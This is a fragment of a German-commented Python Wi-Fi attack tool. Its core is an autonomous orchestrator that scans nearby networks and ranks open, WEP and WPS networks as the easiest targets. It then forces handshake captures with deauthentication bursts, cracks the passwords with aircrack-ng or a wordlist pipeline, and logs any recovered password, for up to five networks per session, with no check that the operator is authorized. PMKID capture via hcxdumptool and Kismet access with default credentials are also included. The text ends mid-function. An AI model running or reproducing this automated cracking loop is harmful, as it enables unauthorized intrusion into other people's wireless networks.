# v11.0: Stealth-Fighter-Klassen
# ══════════════════════════════════════════════════════════════════


class WatchlistEntry:
    """v11.0: Eintrag in der Watchlist."""

    def __init__(self, bssid: str, ssid: str = "", reason: str = "", priority: int = 3):
        self.bssid = bssid.lower().strip()
        self.ssid = ssid
        self.reason = reason
        self.priority = priority  # 1=niedrig, 5=kritisch
        self.first_seen = datetime.now()
        self.last_seen = None
        self.seen_count = 0
        self.alert_triggered = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "bssid": self.bssid,
            "ssid": self.ssid,
            "reason": self.reason,
            "priority": self.priority,
            "first_seen": self.first_seen.isoformat(),
            "last_seen": self.last_seen.isoformat() if self.last_seen else None,
            "seen_count": self.seen_count,
            "alert_triggered": self.alert_triggered,
        }

    @classmethod
    def from_dict(cls, data: dict) -> WatchlistEntry:
        e = cls(
            data.get("bssid", ""),
            data.get("ssid", ""),
            data.get("reason", ""),
            data.get("priority", 3),
        )
        try:
            if data.get("first_seen"):
                e.first_seen = datetime.fromisoformat(data["first_seen"])
            if data.get("last_seen"):
                e.last_seen = datetime.fromisoformat(data["last_seen"])
        except Exception:
            pass
        e.seen_count = data.get("seen_count", 0)
        e.alert_triggered = data.get("alert_triggered", False)
        return e


class WatchlistManager:
    """v11.0: Verwaltet Watchlist-Einträge."""

    def __init__(self, path=None):
        self.path = (
            Path(path) if path else (Path.home() / ".wlan_ultimate" / "watchlist.json")
        )
        self._entries: dict[str, WatchlistEntry] = {}
        self._alert_callbacks = []
        self._load()

    def add(
        self, bssid: str, ssid: str = "", reason: str = "", priority: int = 3
    ) -> WatchlistEntry:
        bssid_l = bssid.lower().strip()
        entry = WatchlistEntry(bssid_l, ssid, reason, priority)
        self._entries[bssid_l] = entry
        self._save()
        return entry

    def remove(self, bssid: str) -> bool:
        b = bssid.lower().strip()
        if b in self._entries:
            del self._entries[b]
            self._save()
            return True
        return False

    def clear(self):
        self._entries.clear()
        self._save()

    def get_all(self) -> list[WatchlistEntry]:
        return list(self._entries.values())

    def check_network(
        self, bssid: str, ssid: str = "", signal: int = 0
    ) -> WatchlistEntry | None:
        """Prüft, ob Netzwerk auf Watchlist. Wenn ja: Update + Callback."""
        b = bssid.lower().strip()
        if b not in self._entries:
            return None
        entry = self._entries[b]
        entry.last_seen = datetime.now()
        entry.seen_count += 1
        if ssid and not entry.ssid:
            entry.ssid = ssid
        # Alarm beim ersten Mal
        if not entry.alert_triggered:
            entry.alert_triggered = True
            self._save()
            for cb in self._alert_callbacks:
                try:
                    cb(entry, signal)
                except Exception:
                    pass
        return entry

    def register_callback(self, cb):
        self._alert_callbacks.append(cb)

    def _save(self):
        try:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            data = [e.to_dict() for e in self._entries.values()]
            self.path.write_text(
                json.dumps(data, indent=2, default=str), encoding="utf-8"
            )
        except Exception:
            pass

    def _load(self):
        if not self.path.exists():
            return
        try:
            data = json.loads(self.path.read_text(encoding="utf-8"))
            for d in data:
                e = WatchlistEntry.from_dict(d)
                self._entries[e.bssid] = e
        except Exception:
            pass


class MultiAdapterManager:
    """v11.0: Verwaltet mehrere WLAN-Adapter parallel."""

    def __init__(self, interface_manager=None, logger=None):
        self.iface_mgr = interface_manager
        self.logger = logger or logging.getLogger("wlan_ultimate.MultiAdapterManager")
        self._active = {}  # name -> {sniffer, channel, task}

    def detect_adapters(self) -> list[dict[str, Any]]:
        """Erkennt alle WLAN-Adapter."""
        adapters = []
        try:
            if self.iface_mgr:
                for name, iface in self.iface_mgr.interfaces.items():
                    adapters.append(
                        {
                            "name": name,
                            "mac": getattr(iface, "mac", ""),
                            "chipset": getattr(iface, "chipset_short", "")
                            or getattr(iface, "chipset", ""),
                            "driver": getattr(iface, "treiber", ""),
                            "monitor": getattr(iface, "monitor_fähig", False),
                            "injection": getattr(iface, "injection_fähig", False),
                            "bands": list(getattr(iface, "frequenzbänder", [])),
                            "is_alfa": getattr(iface, "is_alfa", False),
                        }
                    )
        except Exception:
            pass
        return adapters

    def get_recommended_assignment(self, adapters: list[dict]) -> dict[str, str]:
        """Empfiehlt Aufgaben-Zuweisung (z.B. einer für 2.4, einer für 5 GHz)."""
        result = {}
        # Sortiere: Alfa-Adapter zuerst
        sorted_ad = sorted(
            adapters,
            key=lambda a: (not a.get("is_alfa", False), not a.get("monitor", False)),
        )
        for i, ad in enumerate(sorted_ad):
            if i == 0:
                result[ad["name"]] = "2.4 GHz Scan"
            elif i == 1:
                result[ad["name"]] = "5 GHz Scan"
            elif i == 2:
                result[ad["name"]] = "Injection/Attack"
            else:
                result[ad["name"]] = "Backup/Monitor"
        return result


class KismetRunner:
    """v11.0: Kismet-Integration für passives Monitoring."""

    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger("wlan_ultimate.KismetRunner")
        self._process = None

    def is_available(self) -> bool:
        return shutil.which("kismet") is not None

    def start(self, iface: str, output_dir: str | None = None) -> bool:
        """Startet Kismet im Daemon-Modus."""
        if not self.is_available():
            return False
        try:
            out_dir = output_dir or str(Path.home() / ".wlan_ultimate" / "kismet_logs")
            Path(out_dir).mkdir(parents=True, exist_ok=True)
            cmd = [
                "kismet",
                "-c",
                iface,
                "--log-prefix",
                out_dir + "/kismet",
                "--no-ncurses",
                "--daemonize",
            ]
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.logger.info("Kismet gestartet auf " + str(iface))
            return True
        except Exception as e:
            self.logger.error("Kismet-Start: " + str(e))
            return False

    def stop(self):
        try:
            if self._process:
                self._process.terminate()
                self._process = None
        except Exception:
            pass

    def get_kismet_networks(self) -> list[dict]:
        """Liest Kismet-Ergebnisse (falls Kismet läuft, per REST-API)."""
        # Kismet REST auf localhost:2501
        results = []
        if not REQUESTS_AVAILABLE:
            return results
        try:
            r = requests.get(
                "http://localhost:2501/devices/views/all/devices.json", timeout=2
            )
            if r.status_code == 200:
                data = r.json()
                for d in data:
                    if d.get("kismet.device.base.type") == "Wi-Fi AP":
                        results.append(
                            {
                                "bssid": d.get("kismet.device.base.macaddr", ""),
                                "ssid": d.get("kismet.device.base.name", ""),
                                "channel": d.get("kismet.device.base.channel", 0),
                                "signal": d.get("kismet.common.signal.last_signal", 0),
                            }
                        )
        except Exception:
            pass
        return results


class TimingProfile:
    """
    Kapselt alle Timings, die sich abhaengig von USB-Speed und VM
    unterscheiden. USB 3.0 erlaubt aggressivere Settings, USB 2.0
    braucht konservative Werte.

    Nutzung:
        tp = TimingProfile(usb_speed_mbps=5000, is_vm=True, has_alfa=True)
        timeout = tp.monitor_timeout
    """

    def __init__(
        self, usb_speed_mbps: int = 0, is_vm: bool = False, has_alfa: bool = False
    ):
        self.usb = int(usb_speed_mbps or 0)
        self.vm = bool(is_vm)
        self.alfa = bool(has_alfa)

    # ── Ableitungen ───────────────────────────────────────────────
    @property
    def is_usb3(self) -> bool:
        return self.usb >= 5000

    @property
    def is_usb2(self) -> bool:
        return self.usb == 480 or self.usb == 0

    @property
    def vm_offset(self) -> float:
        """VM braucht mehr Puffer, da USB-Passthrough Latenz addiert."""
        return 1.5 if self.vm else 1.0

    # ── Kernwerte ─────────────────────────────────────────────────
    @property
    def monitor_timeout(self) -> float:
        """Max. Wartezeit fuer iw set type monitor."""
        if self.is_usb3:
            base = 3.0
        else:
            base = 20.0
        return base * self.vm_offset

    @property
    def channel_settle(self) -> float:
        """Wartezeit nach iw set channel, bevor Pakete erwartet werden."""
        if self.is_usb3:
            base = 0.05
        else:
            base = 0.4
        return base * self.vm_offset

    @property
    def warmup_after_mode_switch(self) -> float:
        """Nach Mode-Wechsel: erste Pakete verzögern sich."""
        if self.is_usb3:
            base = 0.5
        else:
            base = 5.0
        return base * self.vm_offset

    @property
    def deauth_burst_size(self) -> int:
        """Anzahl Deauth-Frames pro Burst (USB 3.0 = aggressiver)."""
        if self.is_usb3:
            return 15
        return 5

    @property
    def deauth_burst_interval(self) -> float:
        """Pause zwischen Deauth-Bursts."""
        if self.is_usb3:
            return 0.05
        return 0.2

    @property
    def capture_window(self) -> float:
        """Wartezeit auf Handshake nach Deauth."""
        if self.is_usb3:
            base = 3.0
        else:
            base = 12.0
        return base * self.vm_offset

    @property
    def channel_dwell(self) -> float:
        """v37-A: an Kismet/Airodump angeglichen (USB3 ≈0.15s, USB2 ≈0.35s)."""
        if self.is_usb3:
            base = 0.15
        else:
            base = 0.35
        return base * self.vm_offset

    @property
    def inject_rate_pps(self) -> int:
        """Max. Injection-Rate."""
        if self.is_usb3:
            return 1500
        return 250

    def to_dict(self) -> dict:
        return {
            "usb_speed_mbps": self.usb,
            "is_vm": self.vm,
            "has_alfa": self.alfa,
            "usb_generation": "3.x" if self.is_usb3 else "2.0",
            "monitor_timeout": self.monitor_timeout,
            "channel_settle": self.channel_settle,
            "warmup_after_mode_switch": self.warmup_after_mode_switch,
            "deauth_burst_size": self.deauth_burst_size,
            "deauth_burst_interval": self.deauth_burst_interval,
            "capture_window": self.capture_window,
            "channel_dwell": self.channel_dwell,
            "inject_rate_pps": self.inject_rate_pps,
        }

    def __repr__(self) -> str:
        return (
            f"<TimingProfile USB={'3.x' if self.is_usb3 else '2.0'} "
            f"VM={self.vm} dwell={self.channel_dwell}s "
            f"deauth={self.deauth_burst_size}x>"
        )


class OrchestratorState(Enum):
    IDLE = "idle"
    SCANNING = "scanning"
    TARGET_LOCKED = "target_locked"
    CAPTURING = "capturing"
    CRACKING = "cracking"
    COOLDOWN = "cooldown"
    STOPPED = "stopped"
    ERROR = "error"


class AdapterOrchestrator:
    """
    Zustandsmaschine auf einem einzigen WLAN-Adapter.

    Ablauf:
      IDLE → SCANNING → TARGET_LOCKED → CAPTURING → CRACKING → COOLDOWN → SCANNING
    """

    def __init__(self, controller: Any, iface_name: str):
        self.controller = controller
        self.iface_name = iface_name
        self.logger = logging.getLogger("wlan_ultimate.AdapterOrchestrator")
        self._lock = threading.RLock()
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None

        # Timing
        self.timing = self._detect_timing()

        # Zustand
        self.state: OrchestratorState = OrchestratorState.IDLE
        self.current_target: str | None = None
        self.current_channel: int = 0

        # Session
        self._session_start = time.time()
        self._targets_seen: set[str] = set()
        self._targets_captured: set[str] = set()
        self._targets_cracked: set[str] = set()
        self._blacklist: dict[str, float] = {}

        # Konfiguration
        self.min_signal_dbm: int = -75
        self.score_threshold: int = 40
        self.blacklist_seconds: float = 300.0
        self.scan_duration: float = 90.0
        self.max_cracks_per_session: int = 5

        # Callbacks
        self.on_state_change: Callable | None = None
        self.on_log: Callable | None = None
        self.on_target_found: Callable | None = None
        self.on_password_found: Callable | None = None

    def _detect_timing(self) -> TimingProfile:
        """Ermittelt Timing-Profil aus HardwareScanner."""
        try:
            hw = HardwareScanner()
            report = hw.full_report()
            wlan = report.get("wlan_adapters", [])
            if wlan:
                a = wlan[0]
                usb_speed = int(a.get("usb_speed", "0") or 0)
                has_alfa = bool(a.get("is_alfa"))
            else:
                usb_speed, has_alfa = 0, False
        except (OSError, subprocess.SubprocessError, ValueError):
            usb_speed, has_alfa = 0, False

        is_vm = False
        try:
            rc, out, _ = CommandRunner.run(
                ["systemd-detect-virt"], subsystem="support", soft_fail=True, timeout=2
            )
            if rc == 0 and out.strip() and out.strip() != "none":
                is_vm = True
        except (OSError, subprocess.SubprocessError):
            pass

        tp = TimingProfile(usb_speed, is_vm, has_alfa)
        self.logger.info("TimingProfile: " + repr(tp))
        return tp

    # ── Steuerung ─────────────────────────────────────────────────
    def start(self) -> bool:
        with self._lock:
            if self._thread and self._thread.is_alive():
                self.logger.warning("Orchestrator laeuft bereits")
                return False
            self._stop_event.clear()
            self.state = OrchestratorState.IDLE
            self._thread = threading.Thread(
                target=_thread_wrap(self._run_loop, "AdapterOrchestrator"), daemon=True, name="AdapterOrchestrator"
            )
            self._thread.start()
            self._log("Orchestrator gestartet", "OK")
            return True

    def stop(self) -> None:
        self._stop_event.set()
        with self._lock:
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=5.0)
        self._set_state(OrchestratorState.STOPPED)
        self._log("Orchestrator gestoppt", "INFO")

    def is_running(self) -> bool:
        with self._lock:
            return self._thread is not None and self._thread.is_alive()

    # ── Callbacks ─────────────────────────────────────────────────
    def _set_state(self, state: OrchestratorState) -> None:
        with self._lock:
            old = self.state
            self.state = state
        if old != state:
            self._log("Status: " + old.value + " → " + state.value, "INFO")
            try:
                if self.on_state_change:
                    self.on_state_change(state)
            except (RuntimeError, TypeError):
                pass

    def _log(self, msg: str, level: str = "INFO") -> None:
        self.logger.info("[" + level + "] " + msg)
        try:
            if self.on_log:
                self.on_log(msg, level)
        except (RuntimeError, TypeError):
            pass

    # ── Hauptloop ─────────────────────────────────────────────────
    def _run_loop(self) -> None:
        try:
            while not self._stop_event.is_set():
                if self.state in (OrchestratorState.IDLE, OrchestratorState.COOLDOWN):
                    self._do_scan_phase()
                elif self.state == OrchestratorState.SCANNING:
                    self._do_target_selection()
                elif self.state == OrchestratorState.TARGET_LOCKED:
                    self._do_capture_phase()
                elif self.state == OrchestratorState.CAPTURING:
                    self._do_crack_phase()
                elif self.state == OrchestratorState.CRACKING:
                    self._do_cooldown_phase()
                else:
                    time.sleep(0.5)
        except Exception as exc:
            self.logger.exception("Orchestrator-Crash")
            self._set_state(OrchestratorState.ERROR)
            self._log("Fehler: " + str(exc), "ERR")

    # ── Phase 1: SCAN ─────────────────────────────────────────────
    def _do_scan_phase(self) -> None:
        self._set_state(OrchestratorState.SCANNING)
        self._log("Phase 1: Scannen fuer " + str(int(self.scan_duration)) + "s", "INFO")

        # Interface sicher im Monitor-Modus
        if not self._ensure_monitor():
            self._set_state(OrchestratorState.ERROR)
            return

        try:
            if self.controller.scanner is not None:
                self.controller.scanner.max_dauer = int(self.scan_duration)
                if not self.controller.scanner.isRunning():
                    self.controller.scanner.start()
        except (AttributeError, RuntimeError) as exc:
            self._log("Scan-Start: " + str(exc), "ERR")
            time.sleep(2)
            return

        # Warten bis Scan fertig oder Stop
        scan_start = time.time()
        while not self._stop_event.is_set():
            time.sleep(0.5)
            if time.time() - scan_start > self.scan_duration + 15:
                break
            try:
                if not self.controller.scanner.isRunning():
                    break
            except (AttributeError, RuntimeError):
                break

        if self._stop_event.is_set():
            return

        # Netze einsammeln
        try:
            networks = list(getattr(self.controller, "aktuelle_netzwerke", []) or [])
        except (AttributeError, TypeError):
            networks = []
        self._log("Scan-Phase beendet: " + str(len(networks)) + " Netze", "OK")

    # ── Phase 2: TARGET-Auswahl ───────────────────────────────────
    def _do_target_selection(self) -> None:
        """Waehlt bestes Ziel aus gescannten Netzwerken."""
        self._set_state(OrchestratorState.SCANNING)
        try:
            networks = list(getattr(self.controller, "aktuelle_netzwerke", []) or [])
        except (AttributeError, TypeError):
            networks = []

        now = time.time()
        candidates = []
        for n in networks:
            bssid = (getattr(n, "bssid", "") or "").lower()
            if not bssid:
                continue
            # Blacklist pruefen
            if bssid in self._blacklist:
                if now - self._blacklist[bssid] < self.blacklist_seconds:
                    continue
            # Signal
            sig = getattr(n, "signal_stärke", -100)
            if sig < self.min_signal_dbm:
                continue
            # Score
            try:
                score = n.get_sicherheits_score()
            except (AttributeError, TypeError):
                score = 50
            if score >= self.score_threshold:
                continue
            # Krypto aussortieren
            enc = str(getattr(n, "verschlüsselung", "")).upper()
            if enc in ("WPA3",):
                continue
            # WEP/OPEN bevorzugen
            priority = 0
            if enc == "OPEN":
                priority += 100
            elif enc == "WEP":
                priority += 80
            elif enc == "WPA":
                priority += 40
            elif enc == "WPA2":
                priority += 20
            if getattr(n, "wps_aktiv", False):
                priority += 30
            # Signal-Bonus
            priority += max(0, sig + 90)
            candidates.append((priority, n))

        if not candidates:
            self._log("Kein passendes Ziel - neuer Scan", "INFO")
            self._set_state(OrchestratorState.COOLDOWN)
            return

        candidates.sort(key=lambda x: -x[0])
        best = candidates[0][1]
        self.current_target = (getattr(best, "bssid", "") or "").lower()
        self.current_channel = getattr(best, "kanal", 0)
        self._targets_seen.add(self.current_target)
        self._log(
            "Ziel gewaehlt: "
            + str(getattr(best, "ssid", "?"))
            + " ("
            + self.current_target
            + ") "
            + "Kanal "
            + str(self.current_channel),
            "OK",
        )
        try:
            if self.on_target_found:
                self.on_target_found(best)
        except (RuntimeError, TypeError):
            pass
        self._set_state(OrchestratorState.TARGET_LOCKED)

    # ── Phase 3: CAPTURE ──────────────────────────────────────────
    def _do_capture_phase(self) -> None:
        target = self.current_target
        if not target:
            self._set_state(OrchestratorState.COOLDOWN)
            return
        self._log(
            "Phase 2: Capture auf " + target + " Kanal " + str(self.current_channel),
            "INFO",
        )

        # Interface im Monitor-Modus
        if not self._ensure_monitor():
            self._blacklist[target] = time.time()
            self._set_state(OrchestratorState.COOLDOWN)
            return

        # Kanal locken
        try:
            CommandRunner.run(
                [
                    "iw",
                    "dev",
                    self.iface_name,
                    "set",
                    "channel",
                    str(self.current_channel),
                ],
                subsystem="scan",
                tag="orch-ch",
                soft_fail=True,
                timeout=5,
            )
            time.sleep(self.timing.channel_settle)
        except (OSError, subprocess.SubprocessError):
            pass

        # Capture-Verzeichnis
        try:
            cap_dir = AppKonstanten.CAPTURE_DIR
            cap_dir.mkdir(parents=True, exist_ok=True)
            prefix = (
                "orch_"
                + target.replace(":", "")
                + "_"
                + datetime.now().strftime("%H%M%S")
            )
            out_file = cap_dir / prefix
        except (OSError, AttributeError):
            self._blacklist[target] = time.time()
            self._set_state(OrchestratorState.COOLDOWN)
            return

        # Airodump + Deauth
        cap_file = None
        try:
            if self.controller.attack_ctrl is not None:
                self._log("Starte Airodump + Deauth auf " + target, "INFO")
                cap_file = self.controller.attack_ctrl.capture_handshake(
                    self.iface_name,
                    target,
                    self.current_channel,
                    output_prefix=str(out_file),
                    timeout=int(self.timing.capture_window) + 10,
                    use_deauth=True,
                )
        except (AttributeError, RuntimeError, OSError) as exc:
            self._log("Capture-Fehler: " + str(exc), "ERR")

        if cap_file and Path(cap_file).exists():
            self._log("Handshake erfasst: " + str(cap_file), "OK")
            self._targets_captured.add(target)
            self._current_capture = cap_file
            self._set_state(OrchestratorState.CAPTURING)
        else:
            self._log(
                "Kein Handshake - Blacklist fuer "
                + str(int(self.blacklist_seconds))
                + "s",
                "WARN",
            )
            self._blacklist[target] = time.time()
            self._set_state(OrchestratorState.COOLDOWN)

    # ── Phase 4: CRACK ────────────────────────────────────────────
    def _do_crack_phase(self) -> None:
        target = self.current_target
        cap_file = getattr(self, "_current_capture", None)
        if not target or not cap_file:
            self._set_state(OrchestratorState.COOLDOWN)
            return

        self._log("Phase 3: Crack-Versuch auf " + target, "INFO")

        wl = None
        try:
            if hasattr(self.controller, "_wordlist_mgr"):
                mgr = self.controller._wordlist_mgr
                if mgr is not None:
                    wls = mgr.discover()
                    if wls:
                        wl = wls[0].get("path")
        except (AttributeError, TypeError, KeyError):
            pass

        if not wl:
            self._log("Keine Wortliste - Crack uebersprungen", "WARN")
            self._set_state(OrchestratorState.COOLDOWN)
            return

        # Crack-Pipeline
        pwd = None
        try:
            cp = getattr(self.controller, "_crack_pipeline", None)
            if cp is not None:
                self._log("Starte Crack-Pipeline mit " + str(wl), "INFO")
                res = cp.full_pipeline(Path(cap_file), wl)
                if res.get("success"):
                    pwd = res.get("password")
        except (OSError, RuntimeError, AttributeError) as exc:
            self._log("Crack-Fehler: " + str(exc), "ERR")

        if pwd:
            self._log("PASSWORT gefunden: " + str(pwd), "OK")
            self._targets_cracked.add(target)
            try:
                if self.on_password_found:
                    self.on_password_found(target, pwd)
            except (RuntimeError, TypeError):
                pass
        else:
            self._log("Crack ohne Erfolg", "WARN")

        # Limit erreicht?
        if len(self._targets_cracked) >= self.max_cracks_per_session:
            self._log("Max Crack-Anzahl erreicht - stoppe", "OK")
            self._stop_event.set()
        self._set_state(OrchestratorState.COOLDOWN)

    # ── Phase 5: COOLDOWN ─────────────────────────────────────────
    def _do_cooldown_phase(self) -> None:
        self._set_state(OrchestratorState.COOLDOWN)
        cooldown = 5.0
        self._log("Cooldown " + str(int(cooldown)) + "s", "INFO")
        self._stop_event.wait(cooldown)
        if not self._stop_event.is_set():
            self._set_state(OrchestratorState.SCANNING)

    # ── Hilfsmethoden ─────────────────────────────────────────────
    def _ensure_monitor(self) -> bool:
        """Stellt sicher dass Interface im Monitor-Modus ist."""
        try:
            rc, out, _ = CommandRunner.run(
                ["iw", "dev", self.iface_name, "info"],
                subsystem="driver",
                tag="orch-mon",
                soft_fail=True,
                timeout=5,
            )
            if "type monitor" in out.lower():
                return True
            # Mode wechseln
            self._log("Wechsle in Monitor-Modus", "INFO")
            CommandRunner.run(
                ["ip", "link", "set", self.iface_name, "down"],
                subsystem="driver",
                tag="orch-mon",
                soft_fail=True,
                timeout=5,
            )
            rc, _, _ = CommandRunner.run(
                ["iw", "dev", self.iface_name, "set", "type", "monitor"],
                subsystem="driver",
                tag="orch-mon",
                soft_fail=True,
                timeout=int(self.timing.monitor_timeout),
            )
            CommandRunner.run(
                ["ip", "link", "set", self.iface_name, "up"],
                subsystem="driver",
                tag="orch-mon",
                soft_fail=True,
                timeout=5,
            )
            time.sleep(self.timing.warmup_after_mode_switch)
            return rc == 0
        except (OSError, subprocess.SubprocessError):
            return False

    def get_statistics(self) -> dict:
        with self._lock:
            return {
                "state": self.state.value,
                "current_target": self.current_target,
                "current_channel": self.current_channel,
                "targets_seen": len(self._targets_seen),
                "targets_captured": len(self._targets_captured),
                "targets_cracked": len(self._targets_cracked),
                "blacklist_size": len(self._blacklist),
                "session_duration": time.time() - self._session_start,
                "timing": self.timing.to_dict(),
            }


class KaliToolChain:
    """
    Kombiniert Kali-Tools zu Workflows:
    - Kismet laeuft im Hintergrund, REST-API wird abgegriffen
    - Aircrack-ng als Alternative zu hashcat
    - hcxdumptool fuer PMKID
    - optionale Airgraph-Visualisierung
    """

    def __init__(self, iface_name: str, logger: Any | None = None):
        self.iface_name = iface_name
        self.logger = logger or logging.getLogger("wlan_ultimate.KaliToolChain")
        self._procs: dict[str, subprocess.Popen] = {}
        self._lock = threading.RLock()

    def has(self, tool: str) -> bool:
        return shutil.which(tool) is not None

    def check_all(self) -> dict:
        tools = (
            "kismet",
            "aircrack-ng",
            "airodump-ng",
            "aireplay-ng",
            "hcxdumptool",
            "hcxpcapngtool",
            "hashcat",
            "airgraph-ng",
        )
        return {t: self.has(t) for t in tools}

    def start_kismet(self, out_dir: Path | None = None) -> bool:
        if not self.has("kismet"):
            self.logger.warning("Kismet nicht installiert")
            return False
        if self._is_running("kismet"):
            self.logger.info("Kismet laeuft bereits")
            return True
        try:
            out = (
                Path(out_dir)
                if out_dir
                else (Path.home() / ".wlan_ultimate" / "kismet_logs")
            )
            out.mkdir(parents=True, exist_ok=True)
            cmd = [
                "kismet",
                "-c",
                self.iface_name,
                "--log-prefix",
                str(out / "kismet"),
                "--no-ncurses",
            ]
            proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            with self._lock:
                self._procs["kismet"] = proc
            self.logger.info("Kismet gestartet (PID " + str(proc.pid) + ")")
            return True
        except (OSError, subprocess.SubprocessError) as e:
            self.logger.error("Kismet-Start: " + str(e))
            return False

    def stop_kismet(self) -> None:
        self._stop_proc("kismet")

    def kismet_networks(
        self,
        host: str = "http://127.0.0.1:2501",
        user: str = "kismet",
        password: str = "admin",
    ) -> list:
        """Liest Kismet-REST-API."""
        if requests is None:
            return []
        try:
            r = requests.get(
                host.rstrip("/") + "/devices/views/all/devices.json",
                auth=(user, password),
                timeout=5,
            )
            if r.status_code != 200:
                return []
            data = r.json()
            result = []
            for d in data:
                if d.get("kismet.device.base.type") != "Wi-Fi AP":
                    continue
                result.append(
                    {
                        "bssid": d.get("kismet.device.base.macaddr", "").lower(),
                        "ssid": d.get("kismet.device.base.name", ""),
                        "channel": d.get("kismet.device.base.channel", 0),
                        "crypt": d.get("kismet.device.base.crypt", ""),
                    }
                )
            return result
        except (requests.RequestException, ValueError):
            return []

    # ── Aircrack als Fallback zu hashcat ──────────────────────────
    def crack_with_aircrack(
        self,
        cap_file: Path,
        wordlist: Path,
        bssid: str | None = None,
        timeout: int = 300,
    ) -> str | None:
        if not self.has("aircrack-ng"):
            self.logger.warning("aircrack-ng nicht installiert")
            return None
        if not Path(cap_file).exists():
            self.logger.error("Capture fehlt: " + str(cap_file))
            return None
        try:
            cmd = ["aircrack-ng", "-w", str(wordlist)]
            if bssid:
                cmd.extend(["-b", bssid])
            cmd.append(str(cap_file))
            self.logger.info("Aircrack: " + " ".join(cmd))
            rc, out, err = CommandRunner.run(
                cmd, subsystem="crack", tag="aircrack", soft_fail=True, timeout=timeout
            )
            # KEY FOUND! [ password ]
            for line in (out + err).splitlines():
                m = re.search(r"KEY FOUND!\s*\[\s*([^\]]+)\s*\]", line)
                if m:
                    return m.group(1).strip()
        except (OSError, subprocess.SubprocessError) as e:
            self.logger.error("Aircrack-Fehler: " + str(e))
        return None

    # ── PMKID via hcxdumptool ─────────────────────────────────────
    def capture_pmkid(self, target_bssid: str, timeout: int = 60) -> Path | None:
        if not self.has("hcxdumptool"):
            self.logger.warning("hcxdumptool fehlt")
            return None
        try:
            out_dir = AppKonstanten.CAPTURE_DIR
            out_dir.mkdir(parents=True, exist_ok=True)
            out_file = out_dir / ("pmkid_" + target_bssid.replace(":", "") + ".pcapng")
            # v37-R34 P15c: hcxdumptool 7.x - --enable_status weg,
            # --filtermode weg (Filter laeuft ueber --filterlist_ap),
            # MAC-Adresse ohne Doppelpunkte.
            cmd = [
                "hcxdumptool",
                "-i",
                self.iface_name,
                "-w",
                str(out_file),
                "--filterlist_ap=" + target_bssid.replace(":", ""),
                "--rds=1",
            ]
            self.logger.info("hcxdumptool laeuft " + str(timeout) + "s")
            CommandRunner.run(
                cmd, subsystem="injection", tag="pmkid", soft_fail=True, timeout=timeout
            )
            if out_file.exists() and out_file.stat().st_size > 100:
                # Konvertieren
                hash_file = out_file.with_suffix(".22000")
                if self.has("hcxpcapngtool"):
                    CommandRunner.run(
                        ["hcxpcapngtool", "-o", str(hash_file), str(out_file)],
                        subsystem="injection",
                        tag="pmkid-conv",
                        soft_fail=True,
                        timeout=30,
                    )
                    if hash_file.exists():
                        return hash_file
                return out_file
        except (OSError, subprocess.SubprocessError) as e:
            self.logger.error("PMKID-Fehler: " + str(e))
        return None

    # ── Interne Helper ────────────────────────────────────────────
    def _is_running(self, name: str) -> bool:
        with self._lock:
            p = self._procs.get(name)
            return p is not None and p.poll() is None

    def _stop_proc(self, name: str) -> None:
        with self._lock:
            p = self._procs.pop(name, None)
        if p and p.poll() is None:
            try:
                p.terminate()
                p.wait(timeout=3)
            except (OSError, subprocess.SubprocessError):
                try:
                    p.kill()
                except (OSError, subprocess.SubprocessError):
                    pass

    def stop_all(self) -> None:
        for name in list(self._procs.keys()):
            self._stop_proc(name)


# ══════════════════════════════════════════════════════════════════
# v34: AdapterWatchdog — ueberwacht WLAN-Interface, erkennt Verlust,
#      loggt und ruft Callbacks. Reagiert auf Hotplug.
# ══════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════
# v34: AdapterWatchdog — ueberwacht WLAN-Interface, erkennt Verlust,
#      loggt und ruft Callbacks. Reagiert auf Hotplug.
# ══════════════════════════════════════════════════════════════════


class AdapterWatchdog(QThread):
    """
    Ueberwacht ein WLAN-Interface in festen Intervallen.

    Erkennt:
    - Interface verloren (USB-Reset, VBox-Passthrough-Abbruch)
    - Interface zurueck (nach Re-Enumeration)
    - Modus-Aenderung (managed <-> monitor)
    - TX-Power-Abfall

    Signale:
    - adapter_lost(iface): Interface war da, ist jetzt weg
    - adapter_back(iface): Interface ist zurueck
    - status_update(iface, status): regelmaessig fuer GUI
    """

    adapter_lost = pyqtSignal(str)
    adapter_back = pyqtSignal(str)
    status_update = pyqtSignal(str, dict)

    def __init__(self, iface_name: str, interval: float = 5.0, parent=None):
        super().__init__(parent)
        self.iface_name = iface_name
        self.interval = interval
        self._stop = threading.Event()
        # v37-R34 P13a: separates Event, damit pause/resume moeglich
        # ist, ohne den Thread zu beenden.
        self._suspended = threading.Event()
        self._last_state: bool = True
        self._last_mode: str = ""
        self._logger = logging.getLogger("wlan_ultimate.AdapterWatchdog")

    def stop(self):
        self._stop.set()

    def pause(self) -> None:
        """v37-R34 P13a: haelt Checks an (z.B. waehrend Monitor-Wechsel)."""
        self._suspended.set()

    def resume(self) -> None:
        """v37-R34 P13a: setzt Checks fort."""
        self._suspended.clear()

    def is_paused(self) -> bool:
        return self._suspended.is_set()

    def run(self):
        while not self._stop.is_set():
            self._stop.wait(self.interval)
            if self._stop.is_set():
                break
            self._check_once()

    def _check_once(self):
        """Prueft Interface-Zustand."""
        # v37-R34 P13a: bei pause() nichts tun - Interface-Zugriffe
        # wuerden sonst mit 'ip link set down' parallel laufen.
        if self._suspended.is_set():
            return
        try:
            exists = Path("/sys/class/net/" + self.iface_name).exists()
        except (OSError, ValueError):
            exists = False

        # Verlust erkannt?
        if self._last_state and not exists:
            AdapterEvents.note_lost(self.iface_name)  # v37-B
            self._logger.warning(
                "[ADAPTER-LOST] " + self.iface_name + " ist vom System verschwunden"
            )
            try:
                self.adapter_lost.emit(self.iface_name)
            except (RuntimeError, TypeError):
                pass
        # Rueckkehr erkannt?
        elif not self._last_state and exists:
            AdapterEvents.note_back(self.iface_name)  # v37-B
            self._logger.info("[ADAPTER-BACK] " + self.iface_name + " ist zurueck")
            try:
                self.adapter_back.emit(self.iface_name)
            except (RuntimeError, TypeError):
                pass

        self._last_state = exists

        # Status-Details sammeln (nur wenn Interface da)
        info: dict = {"present": exists}
        if exists:
            try:
                mode = "?"
